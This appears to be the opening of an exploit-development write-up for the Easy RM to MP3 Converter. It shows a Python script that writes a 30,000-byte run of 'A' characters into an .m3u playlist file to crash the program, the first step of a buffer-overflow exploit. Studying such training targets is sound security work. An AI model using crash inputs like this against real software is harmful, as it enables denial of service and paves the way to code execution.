# EasyRMtoMP3Converter

## Initial Crash

```py
#!/usr/bin/python 

file = "crash1.m3u"
f = open(file , "w")

CRASH_LEN = 30000  # change me

junk = "A" * CRASH_LEN
f.write(junk)
f.close()
```
